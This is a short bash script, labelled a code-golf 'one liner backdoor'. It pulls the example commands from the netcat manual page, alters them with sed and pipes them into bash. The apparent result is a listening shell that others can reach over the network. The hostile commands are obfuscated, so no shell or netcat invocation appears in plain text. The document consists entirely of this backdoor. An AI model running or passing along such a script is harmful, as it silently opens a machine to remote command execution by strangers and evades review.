#!/bin/bash
# Code golf one liner backdoor
man nc | grep -Pom 2 '(?<=\$ )[^n].*' | sed 's/12.*1/1/' | bash
